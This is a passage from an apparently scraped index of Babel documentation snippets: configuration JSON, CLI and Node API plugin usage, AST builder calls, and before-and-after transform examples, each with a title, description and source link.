https://github.com/babel/website/blob/main/docs/plugin-syntax-module-string-names.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-module-string-names\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Top-Level Await Parser Plugin\nDESCRIPTION: This code enables the `topLevelAwait` plugin in `@babel/parser`.  It parses the input code with the specified plugin, allowing the use of `await` outside of async functions within modules. This is necessary for parsing top-level await syntax correctly.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nparser.parse(inputCode, {\n  plugins: [\"topLevelAwait\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Transpiling JavaScript with @babel/standalone in HTML\nDESCRIPTION: This snippet shows how to use @babel/standalone to transpile JavaScript within an HTML page. It loads the @babel/standalone library from a CDN and then uses a script tag with the `text/babel` type to write modern JavaScript that will be transpiled by Babel before being executed in the browser.  It displays the output in a div element.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browser/usage.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div id=\"output\"></div>\n<!-- Load Babel -->\n<!-- v6 <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script> -->\n<script src=\"https://unpkg.com/@babel/standalone/babel.min.js\"></script>\n<!-- Your custom script here -->\n<script type=\"text/babel\">\nconst getMessage = () => \"Hello World\";\ndocument.getElementById('output').innerHTML = getMessage();\n</script>\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the @babel/plugin-syntax-throw-expressions plugin via the Babel Node API. It transforms the given code string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-throw-expressions.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-throw-expressions\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Arrow function transformation\nDESCRIPTION: This JavaScript code snippet illustrates the transformation of an arrow function into a standard ES5 function expression by Babel using the `@babel/plugin-transform-arrow-functions` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst fn = () => 1;\n\n// converted to\n\nvar fn = function fn() {\n  return 1;\n};\n```\n\n----------------------------------------\n\nTITLE: Transform Computed Properties - Output with setComputedProperties true\nDESCRIPTION: This code snippet demonstrates the JavaScript code outputted by the @babel/plugin-transform-computed-properties plugin when setComputedProperties is true. Computed properties are directly assigned to the object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _obj;\n\nvar obj = ((_obj = {}),\n(_obj[\"x\" + foo] = \"heh\"),\n(_obj[\"y\" + bar] = \"noo\"),\n(_obj.foo = \"foo\"),\n(_obj.bar = \"bar\"),\n_obj);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Root Directories in JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to configure Babel to consider multiple directories as root directories when searching for `.babelrc.json` files. It includes the project root and packages within a monorepo.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nbabelrcRoots: [\n  // Keep the root as a root\n  \".\",\n\n  // Also consider monorepo packages \"root\" and load their .babelrc.json files.\n  \"./packages/*\",\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring ES2015 Constants and Block Scoping Plugins in .babelrc\nDESCRIPTION: Demonstrates how to configure `check-es2015-constants` and `transform-es2015-block-scoping` plugins in the `.babelrc` file to enable the compilation of ES2015 constants and block scoping features.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\n    \"check-es2015-constants\",\n    \"transform-es2015-block-scoping\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Flow Type Annotation Example JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates a function with Flow type annotations that will be stripped by the plugin. The function `foo` takes three arguments: `one` of type `any`, `two` of type `number`, and an optional `three`. The function returns a string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo(one: any, two: number, three?): string {}\n```\n\n----------------------------------------\n\nTITLE: Configure Jest with Babel in package.json\nDESCRIPTION: This snippet configures Jest to use Babel for transforming JavaScript and TypeScript files before running tests. It adds a test script and specifies the babel-jest transformer. This allows Jest to understand and execute code that uses modern JavaScript features or TypeScript syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/jest/usage.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"scripts\": {\n    \"test\": \"jest\"\n  },\n  \"jest\": {\n    \"transform\": {\n      \"^.+\\\\.[t|j]sx?$\": \"babel-jest\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of using hoistVariables in a Babel plugin\nDESCRIPTION: This JavaScript code demonstrates how to use the `hoistVariables` helper within a Babel plugin to transform code. It shows how to identify a specific function, access its scope, and hoist variables defined within its body to the outer scope, effectively converting variable declarations into assignment expressions.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-hoist-variables.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport hoistVariables from \"@babel/helper-hoist-variables\";\n\n// a naive plugin transforms\n// `(function myEval(){ var x = 1; })()`\n// to\n// `var x;(function myEval(){ x = 1; })()`\n\nmodule.exports = api => {\n  return {\n    visitor: {\n      Function(path) {\n        if (path.node.id.name === \"myEval\") {\n          const outerScope = path.scope.parent;\n          hoistVariables(\n            path.get(\"body\"),\n            id => {\n              // Use Scope#push to register a `var` binding in\n              // the outer scope\n              outerScope.push({ id });\n            },\n            \"var\"\n          );\n        }\n      },\n    },\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API\nDESCRIPTION: Transforms JavaScript code using the Babel Node API, applying the `@babel/plugin-proposal-import-attributes-to-assertions` plugin. It transforms the input `code` string and returns the transformed code. It requires `@babel/core` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-attributes-to-assertions.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-import-attributes-to-assertions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transforming Class Properties - Loose Mode - JavaScript\nDESCRIPTION: This code snippet demonstrates the loose mode of the `babel-plugin-transform-class-properties` plugin, which uses simple assignment for class properties instead of `Object.defineProperty`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  static a = 'foo';\n  x = 'bar';\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  constructor() {\n    this.x = 'bar';\n  }\n};\nBork.a = 'foo';\n```\n\n----------------------------------------\n\nTITLE: Creating a Return Statement Node in Babel\nDESCRIPTION: Creates a `ReturnStatement` AST node using the Babel types module. This node represents a return statement, optionally accepting an argument.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_147\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.returnStatement(argument);\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage Shell\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transpile a JavaScript file (`script.js`) while enabling the `@babel/plugin-syntax-top-level-await` plugin. The `--plugins` option specifies the plugin to use during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-top-level-await.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-top-level-await script.js\n```\n\n----------------------------------------\n\nTITLE: Enable Explicit Resource Management Plugin (JSON)\nDESCRIPTION: Enables the `@babel/plugin-proposal-explicit-resource-management` plugin in Babel configuration. This allows Babel to transform the Explicit Resource Management syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"plugins\": [\n     \"@babel/plugin-proposal-explicit-resource-management\"\n   ]\n }\n```\n\n----------------------------------------\n\nTITLE: Transformed React JSX\nDESCRIPTION: Shows the output of the plugin, replacing React.createElement with babelHelpers.jsx to inline elements.  The 'key' prop becomes the third argument to babelHelpers.jsx.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabelHelpers.jsx(\n  Baz,\n  {\n    foo: \"bar\",\n  },\n  \"1\"\n);\n```\n\n----------------------------------------\n\nTITLE: Enabling Babel plugins with data-plugins attribute\nDESCRIPTION: This snippet illustrates how to enable Babel plugins using the data-plugins attribute. Multiple plugins should be specified as a comma-separated list.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" data-plugins=\"transform-class-properties\">\n\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Invokes the Babel CLI to transform a script using the specified plugin.  The `--plugins` flag specifies the plugin to use.  This provides a command-line interface for transforming JavaScript files.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-sticky-regex.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-sticky-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Creating an AssignmentExpression Node\nDESCRIPTION: Creates an AST node representing an assignment expression. Requires `operator` (a string), `left` (an `LVal | OptionalMemberExpression`), and `right` (an `Expression`). Use `t.isAssignmentExpression(node, opts)` to check if a node is an AssignmentExpression and `t.assertAssignmentExpression(node, opts)` to assert that a node is an AssignmentExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.assignmentExpression(operator, left, right);\n```\n\n----------------------------------------\n\nTITLE: Configuring Hack-style Pipeline Operator in Babel (JSON)\nDESCRIPTION: This JSON configuration snippet shows how to enable the Hack-style pipeline operator in Babel using the `@babel/plugin-proposal-pipeline-operator` plugin.  It illustrates setting the `proposal` option to \"hack\" and specifying the `topicToken` to use, either \"#\" or \"%\". This configuration snippet demonstrates customizing Babel's behavior for the pipeline operator.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-07-26-7.15.0.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-pipeline-operator\", {\n      \"proposal\": \"hack\",\n      \"topicToken\": \"#\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Passing caller data to Babel\nDESCRIPTION: This JavaScript snippet shows how to pass `caller` data to Babel's `transformFileSync` method. The `caller` object allows tools wrapping Babel to identify themselves and provide capability-related flags, influencing how plugins and presets behave.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFileSync(\"example.js\", {\n  caller: {\n    name: \"my-custom-tool\",\n    supportsStaticESM: true,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Configuration: Using the plugin with babel.config.json\nDESCRIPTION: Configures the Babel plugin within a babel.config.json file. This is the recommended way to use the plugin.  Add \"transform-inline-consecutive-adds\" to the plugins array to enable the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-consecutive-adds.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-inline-consecutive-adds\"]\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Member Expression Transformation\nDESCRIPTION: Demonstrates the transformation performed by the plugin. Member expressions like `obj.const` are converted to computed properties like `obj[\"const\"]` when the property name is a reserved keyword.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-member-expression-literals.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nobj.foo = \"isValid\";\n\nobj.const = \"isKeyword\";\nobj[\"var\"] = \"isKeyword\";\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nobj.foo = \"isValid\";\n\nobj[\"const\"] = \"isKeyword\";\nobj[\"var\"] = \"isKeyword\";\n```\n\n----------------------------------------\n\nTITLE: Using transform-remove-debugger via Node API\nDESCRIPTION: Demonstrates usage of the 'transform-remove-debugger' plugin via the Babel Node API. The 'transformSync' method is used to transform code synchronously, with the plugin specified in the 'plugins' array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-debugger.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-remove-debugger\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Decorators in Babel 7\nDESCRIPTION: Illustrates the use of decorators in Babel 7 for class modification and enhancement.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_23\n\nLANGUAGE: javascript\nCODE:\n```\n@a class A {}\n```\n\n----------------------------------------\n\nTITLE: Parsing V8 Intrinsics with Babel Parser in JavaScript\nDESCRIPTION: This code snippet demonstrates how to configure `@babel/parser` to parse code containing V8 intrinsic runtime functions using the `v8intrinsic` plugin. The `parse` function from `@babel/parser` is used to parse the code with the specified plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-09-05-7.6.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { parse } = require(\"@babel/parser\");\n\nparse(code, {\n  plugins: [\"v8intrinsic\"]\n})\n```\n\n----------------------------------------\n\nTITLE: Export Default From (JavaScript)\nDESCRIPTION: This snippet showcases the usage of `@babel/plugin-proposal-export-default-from`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_22\n\nLANGUAGE: javascript\nCODE:\n```\nexport v from \"mod\";\n```\n\n----------------------------------------\n\nTITLE: Transforming Code Asynchronously\nDESCRIPTION: Illustrates how to use `babel.transform` to asynchronously transform JavaScript code. The function takes code, options, and a callback. The callback receives an error object and a result object containing the transformed code, source map, and AST. This method is backward compatible but transformSync is recommended for synchronous needs in Babel 7+.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transform(code, options, function(err, result) {\n  result; // => { code, map, ast }\n});\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json (JSON)\nDESCRIPTION: This JSON configuration snippet shows how to enable the `@babel/plugin-transform-property-mutators` plugin in a `babel.config.json` file. This is the recommended way to use the plugin as it allows for consistent transformations across different environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-mutators.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-property-mutators\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Async Function Transformation Output with Bluebird JavaScript\nDESCRIPTION: This example demonstrates the output JavaScript code when the async function is transformed into a Bluebird coroutine using the @babel/plugin-transform-async-to-generator plugin with specific options.  It requires the 'bluebird' library.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Bluebird = require(\"bluebird\");\n\nvar foo = Bluebird.coroutine(function*() {\n  yield bar();\n});\n```\n\n----------------------------------------\n\nTITLE: Usage: Babel Plugin via CLI\nDESCRIPTION: Command line usage for the babel-plugin-minify-numeric-literals Babel plugin. This command shows how to use the Babel CLI to transform a file (script.js) using the minify-numeric-literals plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-numeric-literals.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-numeric-literals script.js\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/preset-typescript for type-only imports\nDESCRIPTION: Demonstrates how to configure `@babel/preset-typescript` or `@babel/plugin-transform-typescript` to only consider imports as type-only when the explicit `type` keyword is present.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-typescript\", {\n      \"onlyRemoveTypeImports\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming JSON Strings in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how the babel plugin transforms a string containing a U+2028 character into a string with the unicode escape sequence. This ensures the string is valid JSON.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-strings.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst ex = \"before after\";\n//                ^ There's a U+2028 char between 'before' and 'after'\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst ex = \"before\\u2028after\";\n//                ^ There's a U+2028 char between 'before' and 'after'\n```\n\n----------------------------------------\n\nTITLE: Property Literals Transformation Example (Output)\nDESCRIPTION: This JavaScript code snippet demonstrates the output code after the @babel/plugin-transform-property-literals plugin has transformed the input code.  The 'const' and 'var' properties are converted to string literals. Other properties are not changed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-literals.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = {\n  \"const\": function() {},\n  \"var\": function() {},\n\n  \"default\": 1,\n  [a]: 2,\n  foo: 1,\n};\n```\n\n----------------------------------------\n\nTITLE: Usage: Babel Plugin via Node API\nDESCRIPTION: Demonstrates how to use the babel-plugin-minify-numeric-literals Babel plugin via the Node API. It uses `@babel/core`'s `transformSync` function to transform JavaScript code with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-numeric-literals.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-numeric-literals\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin within the babel.config.json file.  This is the recommended approach for using the plugin.  The \"plugins\" array specifies the plugins that Babel should use to transform the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-sticky-regex.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-sticky-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/preset-stage-3 via npm\nDESCRIPTION: Installs the @babel/preset-stage-3 preset as a development dependency using npm. This allows Babel to utilize the preset for transforming JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-3.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/preset-stage-3\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-shorthand-properties plugin directly from the command line using the Babel CLI. It processes a script.js file with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-shorthand-properties script.js\n```\n\n----------------------------------------\n\nTITLE: Configuration via babel.config.json\nDESCRIPTION: This JSON snippet configures Babel to use the `transform-simplify-comparison-operators` plugin.  Adding this to your `babel.config.json` will automatically apply the transformation to all your code processed by Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-simplify-comparison-operators.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-simplify-comparison-operators\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Modern Browsers JSON Import Transformation (JavaScript)\nDESCRIPTION: This JavaScript code shows how Babel transforms the JSON module import for modern browsers, leveraging `fetch` and `import.meta.resolve`. It fetches the JSON file and parses it.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-02-28-7.24.0.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst myConfig = await fetch(import.meta.resolve(\"./config.json\"))\n                        .then(r => r.json());\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin\nDESCRIPTION: This JSON configuration file shows how to add the `@babel/plugin-proposal-import-wasm-source` plugin to a Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-proposal-import-wasm-source\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Importing plugins compat data in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to import the plugins compatibility data from the @babel/compat-data package. The imported data is used to determine which Babel plugins are needed for a given set of compilation targets.\nSOURCE: https://github.com/babel/website/blob/main/docs/compat-data.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport _plugins from \"@babel/compat-data/plugins\";\nconst pluginsCompatData = _plugins.default;\n```\n\n----------------------------------------\n\nTITLE: Using Maps JavaScript\nDESCRIPTION: This code demonstrates the use of the `Map` data structure. It creates a new Map, sets key-value pairs, and retrieves values. It requires the Babel polyfill. It showcases basic operations on a Map.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_21\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Maps\nvar m = new Map();\nm.set(\"hello\", 42);\nm.set(s, 34);\nm.get(s) == 34;\n```\n\n----------------------------------------\n\nTITLE: Transformed Private Methods (privateFieldsAsProperties)\nDESCRIPTION: This JavaScript code shows the transformation of the private method when the `privateFieldsAsProperties` assumption is enabled. It uses `Object.defineProperty` to define the private method directly on the class instance, improving performance but potentially leaking private members.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Foo = function Foo() {\n  \"use strict\";\n\n  babelHelpers.classCallCheck(this, Foo);\n  Object.defineProperty(this, _privateMethod, {\n    value: _privateMethod2,\n  });\n  this.publicField = babelHelpers\n    .classPrivateFieldLooseBase(this, _privateMethod)\n    [_privateMethod]();\n};\n\nvar _privateMethod = babelHelpers.classPrivateFieldLooseKey(\"privateMethod\");\n\nvar _privateMethod2 = function _privateMethod2() {\n  return 42;\n};\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - Variable Declaration (JavaScript)\nDESCRIPTION: Illustrates the usage of object rest spread in variable declarations.  It shows how to extract specific properties while capturing the rest in another variable.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { a, ...b } = c; // VariableDeclaration\n```\n\n----------------------------------------\n\nTITLE: Checking for Loop Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node represents a loop statement. It uses the `t.isLoop(node)` method from Babel's `types` API. This covers nodes such as `WhileStatement`, `DoWhileStatement`, `ForStatement`, `ForInStatement`, and `ForOfStatement`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_280\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isLoop(node);\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI\nDESCRIPTION: This command shows how to use the plugin via the Babel CLI. It transforms the specified JavaScript file (script.js) using the @babel/plugin-transform-for-of plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-for-of script.js\n```\n\n----------------------------------------\n\nTITLE: Set Spread Properties JavaScript\nDESCRIPTION: This JavaScript snippet shows object spread syntax. When the `setSpreadProperties` assumption is enabled, Babel assumes that spreading properties doesn't trigger getters on the target object. As a result, Babel assigns them directly, foregoing `Object.defineProperty`, enhancing performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_21\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst result = {\n  set name(value) {},\n  ...obj,\n};\n```\n\n----------------------------------------\n\nTITLE: Async Generator Function Syntax JavaScript\nDESCRIPTION: This example shows the syntax for defining an async generator function in JavaScript. The function uses the `async` and `function*` keywords to define an asynchronous generator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-generators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function* agf() {\n  await 1;\n}\n```\n\n----------------------------------------\n\nTITLE: Import Assertions Support in Babel\nDESCRIPTION: This snippet illustrates the use of Import Assertions, a proposal that allows specifying the expected type of imported modules. The `assert` clause verifies the module type at import time. Babel must be configured to support the `import-assertions` proposal for this syntax to work correctly.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport json from \"./foo.json\" assert { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Using transform-remove-debugger via CLI\nDESCRIPTION: Demonstrates usage of the 'transform-remove-debugger' plugin via the Babel CLI. The '--plugins' flag specifies the plugin to use during the transpilation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-debugger.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-remove-debugger script.js\n```\n\n----------------------------------------\n\nTITLE: Use Exponentiation Operator Plugin via Node API JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to use the @babel/plugin-transform-exponentiation-operator programmatically via the Babel Node API. It uses `require('@babel/core').transformSync` to transform the given 'code' string with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-exponentiation-operator.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-exponentiation-operator\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Jasmine with Babel Register (JSON)\nDESCRIPTION: This code snippet demonstrates how to configure Jasmine to use `@babel/register` to transpile code before running tests.  It involves modifying the `jasmine.json` file to include the `@babel/register` hook.  The file path in `helpers` option is relative to `spec_dir`, not to project root path.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/jasmine/usage.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"helpers\": [\n    \"../node_modules/@babel/register/lib/node.js\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configuration to enable the @babel/plugin-transform-optional-catch-binding plugin by including it in the plugins array in babel.config.json.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-catch-binding.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-optional-catch-binding\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json\nDESCRIPTION: This JSON configuration snippet shows how to enable the @babel/plugin-syntax-throw-expressions plugin in a babel.config.json file. This is the recommended method for configuring Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-throw-expressions.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-throw-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin\nDESCRIPTION: Installs the @babel/plugin-syntax-logical-assignment-operators package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-logical-assignment-operators.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-logical-assignment-operators\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin with Loose Mode in babel.config.json\nDESCRIPTION: Example demonstrating how to configure the `@babel/plugin-transform-class-properties` plugin in `babel.config.json` with the `loose` option enabled. This configures the plugin to compile class properties using assignment expressions instead of `Object.defineProperty`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [[\"@babel/plugin-transform-class-properties\", { \"loose\": true }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Template Literals with Loose Mode (In)\nDESCRIPTION: This example showcases the input JavaScript code containing a template literal that will be transformed by the plugin when the `loose` option or the `mutableTemplateObject` assumption is enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n`foo${bar}`;\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage\nDESCRIPTION: Command-line usage of the Babel CLI to transform a file using the @babel/plugin-transform-modules-systemjs plugin. This demonstrates how to use the plugin directly from the command line to transpile individual files.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-systemjs.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-modules-systemjs script.js\n```\n\n----------------------------------------\n\nTITLE: Using with Node API and '@@' topic token\nDESCRIPTION: This JavaScript code shows how to use the @babel/plugin-syntax-pipeline-operator plugin with the Babel Node API, specifying the '@@' topic token. It uses `require('@babel/core').transformSync` to transform the code string with the plugin configured.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-pipeline-operator.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: 